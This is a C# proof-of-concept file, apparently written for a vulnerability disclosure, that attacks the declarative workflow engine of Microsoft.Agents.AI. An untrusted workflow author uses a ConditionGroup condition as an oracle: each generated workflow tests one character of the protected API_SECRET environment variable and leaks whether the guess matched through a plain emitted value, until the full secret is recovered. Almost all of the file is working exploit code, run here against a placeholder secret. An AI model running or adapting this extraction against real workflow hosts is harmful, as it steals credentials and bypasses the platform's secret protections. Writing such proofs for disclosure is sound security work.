// Scenario D: full plaintext recovery of the protected secret by an untrusted workflow author,
// using only the ConditionGroup oracle. Each workflow leaks one character via a non-sensitive literal.
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.Agents.AI;
using Microsoft.Agents.AI.Workflows;
using Microsoft.Agents.AI.Workflows.Declarative;
using Microsoft.Agents.AI.Workflows.Declarative.Events;
using Microsoft.Extensions.AI;

static class Extract
{
    public static async Task RunAsync()
    {
        Environment.SetEnvironmentVariable("API_SECRET", "sk_live_SECRETBIT");
        const string charset = "abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        var recovered = new StringBuilder();
        for (int pos = 1; pos <= 40; pos++)
        {
            // Oracle for length: once Mid past the end returns "", no char matches -> stop.
            bool found = false;
            foreach (char c in charset)
            {
                string yaml =
                    "kind: Workflow\ntrigger:\n  kind: OnConversationStart\n  id: w\n  actions:\n" +
                    "    - kind: ConditionGroup\n      id: g\n      conditions:\n" +
                    $"        - id: c\n          condition: =Mid(Env.API_SECRET, {pos}, 1) = \"{c}\"\n          actions:\n" +
                    "            - kind: SetVariable\n              id: s\n              variable: Local.Hit\n              value: =\"1\"\n" +
                    "    - kind: SendActivity\n      id: a\n      activity: \"{Local.Hit}\"\n";
                if (await EmitsAsync(yaml) == "1") { recovered.Append(c); found = true; break; }
            }
            if (!found) break;
        }
        Console.WriteLine($"[D extraction] recovered secret = \"{recovered}\"  (actual = \"sk_live_SECRETBIT\")  match={recovered.ToString() == "sk_live_SECRETBIT"}");
    }

    static async Task<string?> EmitsAsync(string yaml)
    {
        var opts = new DeclarativeWorkflowOptions(new StubProvider())
        {
            AllowedEnvironmentVariables = new[] { "API_SECRET" },
            AllowProcessEnvironmentVariableFallback = true,
        };
        try {
            using var reader = new StringReader(yaml);
            var wf = DeclarativeWorkflowBuilder.Build<string>(reader, opts);
            await using var run = await InProcessExecution.RunStreamingAsync(wf, "go");
            string? emitted = null;
            await foreach (var ev in run.WatchStreamAsync()) {
                if (ev is MessageActivityEvent m) emitted = m.Message?.Trim();
                if (ev is WorkflowErrorEvent) return null;
            }
            return emitted;
        } catch { return null; }
    }
}
